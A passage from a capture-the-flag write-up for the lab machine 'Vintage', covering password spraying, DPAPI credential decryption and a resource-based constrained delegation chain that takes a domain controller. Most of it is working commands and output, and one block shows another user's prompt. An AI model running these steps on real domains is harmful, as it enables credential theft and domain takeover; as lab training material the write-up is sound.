214b50e6159717b8a1fe9032c26f805769d8e7f69e24ef04392f16f556d063870d3d5af15af0642ae54067ec1d1d3c7d56ede8f866b336bf7bd30156cd34052ab1f317cb47d852520dc858ab1f2d44ba553cbd885eb61474326a4acc352fe2482a2728d4965167aab66eceedf17c2950694375ca5007c50c7c4efce7d4980732cfd06af8594f5214f337bdca26444d71d3775643199035b3e3543586d14f2b42b08b31f248c7b787b5e403dd93ca448f5f02e3a7882185efe62ee6c45020f50a6773d2ad3bcb1503bc8a97be58d55054ffb6e733e7:Zer0the0ne
```

Luckily it worked and we had some shiny new creds: `svc_sql:Zer0the0ne`
# Initial Foothold
## Password spray with svc_sql password

I then went onto spray this using the user list we made earlier (told you it would come in useful!).

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ kerbrute passwordspray -d vintage.htb --dc 10.129.6.64 users.txt Zer0the0ne           

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/18/25 - Ronnie Flathers @ropnop

2025/04/18 20:41:56 >  Using KDC(s):
2025/04/18 20:41:56 >   10.129.6.64:88

2025/04/18 20:41:56 >  [+] VALID LOGIN:  svc_sql@vintage.htb:Zer0the0ne
2025/04/18 20:41:56 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
2025/04/18 20:41:56 >  Done! Tested 12 logins (2 successes) in 0.142 seconds
```

More creds! : `C.Neri@vintage.htb:Zer0the0ne`

We know from earlier enumeration that `C.Neri` can `PSremote` onto the DC.
## Access with C.Neri

Confirming access.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc smb dc01.vintage.htb -u 'C.Neri' -p 'Zer0the0ne' -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

Get TGT

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-getTGT vintage.htb/C.Neri@dc01.vintage.htb 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in C.Neri@dc01.vintage.htb.ccache
```

```bash
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    ticket_lifetime = 24h
    forwardable = true
    renewable = true

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ export KRB5CCNAME=C.Neri@dc01.vintage.htb.ccache
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ evil-winrm -i dc01.vintage.htb -r VINTAGE.HTB -u C.Neri
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cat ..\Desktop\user.txt 
7f26dbdc3863bc7e15a35203a0889a4e
```
# Privilege Escalation

Now to enumerate again and start looking for priv esc options.

Checking what we have access to using `bloodyAD`

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'C.Neri' -p 'Zer0the0ne'  get writable  

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
permission: WRITE

distinguishedName: CN=C.Neri,CN=Users,DC=vintage,DC=htb
permission: WRITE

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```
## DPAPI

After searching around and finding nothing I read about where `DPAPI creds` can be stored and decided to have a look and managed to find something.

```bash
  
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -Force

    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

At this point I tried using `donpapi` to automatically dump the master key and credential files but since this is `vintage` we are going to need to do it the `hard way`.

`Manually base64 encode the files` and then rebuild them on kali.

```bash
*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\BK-VINTAGE" -Encoding byte))
AQAAAPACAACMAAAAAgAAAGeh92cdvwFNlGlnJmQ3x4ZAHwAAJT1y56v3fAdRs53un5hwxxwAAABAAAAAAQUAAAAAAAUVAAAAoYXe77IkM3mNjoR6WwQAAMavBSxJu0yyKIRSjGTXMaomBjzPpbMmVJtrzG6leYPPK8LFMVMDEyYG5IZLqqKBNKtl8VEtWZBdYeaj+WoKVncwggLsMIIB2KADAgECAhDw1PAGVVVTtEXU5f5wn9qnMAkGBSsOAwIdBQAwIzEhMB8GA1UEAxMYdgBpAG4AdABhAGcAZQAuAGgAdABiAAAAMB4XDTI0MDYwNzExMTcwN1oXDTI1MDYwNzExMTcwN1owIzEhMB8GA1UEAxMYdgBpAG4AdABhAGcAZQAuAGgAdABiAAAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzUz2rBeFSA1R1K7t5fZ0jhYBynbAQ/VUzht8Ye1Dnw2ZIVdzJlitrrxxvDd/m93XCNcNIfl1C9diAdbOgsiP1b50qYRzeykgLLFcdHBxq74BYYvVkr8kScHXIMX8AaT1J1D+PKpQWUhrERDhQZGFrOkwZpFoxS7R9re/2ZvbE2XA2cfbqCOH0ciLzDNlcsEhZu+TSq5OtEot4jtI67hwl4dq1FNyXW6ijmOpn962rdsUiDvFSualYz4+UWIq46HzhynxectfN2lMZ60ju/jzs2AteSU4skCqm4/2h74nePO1P5M36tlkUC+3RqFIkrDnD09UVyoGhHeu8Uz7FpGfdQIDAQABgREAp9qfcP7l1EW0U1VVBvDU8IIRAKfan3D+5dRFtFNVVQbw1PAwCQYFKw4DAh0FAAOCAQEAlcLy/QWA+3ycbcspaVu8rbFPqUyL/Cgh+oGfwAFwhN4feVKx3Vlman0jr9rjrAvdwOpAdG82LsdraZY0U5By45Oew7rxJMsezmOeMCkAxQ4hC+TJQSoL6j7dDCry6dVl3AvyovM4YyCvP27f755Pf3LtzvK8dpEvBoB5+UMvPaDj2wtHJiZFN0QE8eBNJUy+pskMMX9wYCTPZaY1JsoskOwW6YS8uEmj+7HJaTLgmbaTjcMPiVRPXtWtW99FwqJsf9jp/F9iRjUFauCdswb9TgD1bpUP0odnow2mUmZ4ucGxqBgYoTGdtmAlTAM0IJhGSbFogRihp2xtmPzlPsN4zA==

*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" -Encoding byte))
AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=

*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -Encoding byte))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=

*Evil-WinRM* PS C:\Users\C.Neri\Documents> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\Preferred" -Encoding byte))
o0HPmVKl90yo16yi1vczm4ChniSF/9oB
```

```bash
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> [Convert]::ToBase64String((Get-Content -path "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6" -Encoding byte))
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```
## Decrypting the Master Key[](https://scotsec.github.io/posts/Vintage/#decrypting-the-master-key)

I didn’t show it here but you can copy the base64 string and echo it in `base64 -d` then output it to a file.

```bash
echo '<BASE64>' | base64 -d > outputfile.txt
```

It turns out that `impacket` really do have a tool for everything!

First we attempt to get the master key which we can then use. In this case there are two but the first one I tried worked.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-dpapi masterkey -file Protect/4dbf04d8-529b-4b4c-b4ae-8e875e4fe847 -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x55d51b40d9aa74e8cdc44a6d24a25c96451449229739a1c9dd2bb50048b60a652b5330ff2635a511210209b28f81c3efe16b5aee3d84b5a1be3477a62e25989f
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-dpapi masterkey -file Protect/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

You can see that we discovered the master key : `Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a`
## Getting C.Neri_ADM password

Using this masterkey we can attempt to decrypt the credential files. One of them gives us the password for the `c.neri_adm` account.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-dpapi credential -file Credentials/C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

Confirming it works

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ nxc smb dc01.vintage.htb -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)                                                                                                             
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312 
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

Checking what we have access to using `bloodyAD`.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312'  get writable 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=vintage,DC=htb
permission: WRITE

distinguishedName: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb
permission: WRITE

distinguishedName: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb
permission: WRITE
```

`DelegatedAdmins` group is very interesting since members of that group have `AllowedToAct` on DC!
## RBCD

At this point things were looking like it was leaning towards being `Resource-based contrained delegation`.

More info : [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)

Lets start by grabbing a ticket for our new user.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-getTGT vintage.htb/C.Neri_adm@dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in C.Neri_adm@dc01.vintage.htb.ccache
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ export KRB5CCNAME=C.Neri_adm@dc01.vintage.htb.ccache
```

![[Pasted image 20260115190556.png]]

This was a pretty complex attack chain to figure out but here is how it works.

Some of these steps are repeated from earlier due to the clean-up scripts that run.

Re-enable the `svc_sql` account.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'C.Neri' -p 'Zer0the0ne' remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

Set a `spn` on the account.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k --dc-ip 10.129.207.195 -u 'C.Neri' -p 'Zer0the0ne' set object svc_sql servicePrincipalName -v 'cifs/vintage.htb' 
[+] svc_sql's servicePrincipalName has been updated
```

Assign `C.Neri_adm` `GenericAll` over the account.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'C.Neri' -p 'Zer0the0ne' add genericAll svc_sql C.Neri_adm 
[+] C.Neri_adm has now GenericAll on svc_sql
```

 Add the `svc_sql` account to the `DelegatedAdmins` group, giving it `AllowedToAct` permissions on the DC.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k -u 'C.Neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' add groupMember "DELEGATEDADMINS" "SVC_SQL"
[+] SVC_SQL added to DELEGATEDADMINS
```

Request a ticket for the account, just in case.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_sql.ccache
                                                                                                                    
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ export KRB5CCNAME=svc_sql.ccache
```

Request a ticket as `svc_sql` requesting to impersonate `L.Bianchi_adm` , We need make sure to supply a valid `SPN for the DC` to impersonate otherwise this wont work. I found this by checking the attributes in bloodhound.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'L.Bianchi_adm' vintage.htb/svc_sql:Zer0the0ne -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating L.Bianchi_adm
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

We see that we get a ticket with a very strange looking name but we did get a `ticket!`.

Lets export it and see if it works.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ export KRB5CCNAME=L.Bianchi_adm@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Using `wmiexec` to login here since this user doesn’t have permission for PSremote. We are able to obtain the root flag.

```bash
┌──(kryzen㉿kali)-[~/HTB/Boxes/Vintage]
└─$ impacket-wmiexec @dc01.vintage.htb -k                                                                     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vintage\l.bianchi_adm

C:\>cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is B8C0-0CD3

 Directory of C:\Users\Administrator\Desktop

11/14/2024  07:48 PM    <DIR>          .
06/08/2024  03:36 PM    <DIR>          ..
04/18/2025  09:37 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,778,948,096 bytes free

C:\Users\Administrator\Desktop>type root.txt
4a886db48e92fc17e241eee7263ef187
```

---